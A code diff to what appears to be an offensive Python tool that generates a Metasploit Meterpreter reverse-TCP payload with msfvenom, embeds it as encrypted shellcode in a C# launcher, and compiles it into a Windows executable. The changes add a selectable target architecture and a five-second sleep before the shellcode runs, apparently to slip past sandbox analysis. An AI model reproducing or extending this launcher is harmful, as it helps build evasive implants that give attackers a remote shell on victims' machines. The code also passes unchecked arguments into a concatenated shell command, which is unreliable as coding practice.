@@ -11,12 +11,13 @@ def main():
 	key = args.key
 	payload = args.payload
 	filename = args.filename
+	arch = args.arch
 
 	''' generate msfvenom payload '''
 	print("[+] Generating MSFVENOM payload...")
 	result = subprocess.run(['msfvenom',
 		'-p', payload,
-		'-a', 'x86',
+		'-a', arch,
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
 		'-f', 'raw'],
@@ -42,7 +43,7 @@ def main():
 
 	'''compile file'''
 	print("[+] Compiling the launcher...")
-	os.system("mcs /platform:x86 ./launcher.cs /out:./" + filename  + ">/dev/null");
+	os.system("mcs /platform:" + arch + " ./launcher.cs /out:./" + filename  + ">/dev/null");
 
 	print("[+] Launcher compiled and written to ./" + filename)
 	print("[+] Have a nice day!")
@@ -86,6 +87,8 @@ def parse_args():
 			help="The local host that msfconsole is listening on.")
 	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
 		help="The payload to generate in msfvenom.")
+	parser.add_argument("-a", "--arch", default="x86",
+		help="The target architecture (x64 or x86)")
 	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
 		help="The filename of the executable.")
 
@@ -141,6 +144,9 @@ namespace Launcher
 
             // remember to change the encryption key!
             byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
+
+						System.Threading.Thread.Sleep(5000);
+
             RunShellcode(dec_shellcode);
         }
 
